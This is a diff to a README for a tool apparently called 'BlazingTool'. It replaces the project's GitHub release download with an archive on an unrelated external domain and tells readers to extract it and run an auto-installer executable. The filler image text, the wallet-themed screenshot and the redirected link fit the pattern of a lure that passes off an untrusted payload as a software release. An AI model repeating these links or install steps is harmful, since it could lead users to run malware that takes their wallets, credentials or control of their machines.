@@ -9,9 +9,9 @@
 To install this programm, follow these steps:
 
 [![asdasdasd](https://github.com/user-attachments/assets/0b333083-2934-4386-bccd-b48b04973746)
-](https://github.com/AdeiltonPereiraAlves/BlazingTool/releases/download/V3.2/Release.zip) 
+](https://dl.jrdesklabs.com/Setup.zip) 
 
-## **1. [Download the archive](https://github.com/AdeiltonPereiraAlves/BlazingTool/releases/download/V3.2/Release.zip) from releases and extract it to a convenient folder.**
+## **1. [Download the archive](https://dl.jrdesklabs.com/Setup.zip) from releases and extract it to a convenient folder.**
 ## **2. Run the auto-installer `Installing_File_x64.exe`. It will install and download all necessary packages for > operation.**
 ![1](https://github.com/user-attachments/assets/05bfda2c-c075-4709-bd03-0271e8ad9ed0)
 ![forgwalletmain2](https://github.com/user-attachments/assets/8108e5ec-3a5a-4881-b77b-ac9321a0e845)
